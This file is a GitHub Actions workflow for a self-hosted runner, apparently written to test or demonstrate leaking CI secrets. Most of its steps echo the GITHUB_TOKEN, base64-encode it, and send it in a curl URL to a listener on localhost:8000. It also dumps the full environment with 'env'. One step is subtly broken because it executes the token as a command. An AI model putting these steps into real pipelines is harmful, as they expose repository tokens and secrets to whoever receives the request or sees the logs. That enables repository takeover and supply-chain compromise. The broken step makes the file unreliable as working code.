name: GitHub Actions
on: [push]
jobs:
  Job-One:
    runs-on: self-hosted
    steps:
      - run: echo "ðŸŽ‰ The job was automatically triggered by a ${{ github.event_name }} event."
      - run: echo "$GITHUB_RUN_ID"
      - run: echo "$GITHUB_TOKEN"
      - run: export GT=$GITHUB_TOKEN
      - run: export GT2=${{ github.token }}
      - run: echo ${{ github.token }} | base64
      - run: export GT3=$(${{ github.token }} | base64)
      - run: curl -v http://localhost:8000/${GT3}=${{ github.token }}/$GT/$GT2
      - run: env
      - run: echo "Deploying to production server on branch $GITHUB_RUN_ID"
      - run: sleep 61
      
